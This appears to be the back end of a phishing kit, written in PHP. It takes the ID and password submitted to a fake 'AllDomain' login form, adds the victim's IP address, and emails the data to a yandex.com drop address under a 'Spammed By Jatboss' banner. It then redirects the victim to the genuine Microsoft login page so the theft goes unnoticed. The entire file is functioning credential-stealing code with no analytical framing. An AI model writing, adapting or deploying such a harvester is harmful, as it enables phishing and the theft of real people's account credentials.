<?php

$ip = getenv("REMOTE_ADDR");
$message .= "------------------ AllDomain Logz! --------------\n";
$message .= "                AllDomain! ID & Password \n";
$message .= "---------------------------------------------------\n";
$message .= "AllDomain ID: ".$_POST['UserName']."\n";
$message .= "Password: " .$_POST['Password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------- Spammed By Jatboss -----------\n";


$recipient = "pizle.reportpage@yandex.com";

$subject = "AllDomain Logz!";
$from = "Jatboss@results.net";
$headers = "From: $from\r\n";
$headers .= "Return-Path: <".$recipient.">\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$$headers .= "MIME-Version: 1.0\n";
$arr=array($recipient);
foreach ($arr as $recipient){$carcabot = mail($recipient,$subject,$message,$headers);}
if ($carcabot)
       {
           header("Location: https://login.microsoftonline.com");

       }
else
           {
         echo "ERROR! Please go back and try again.";
         }

?>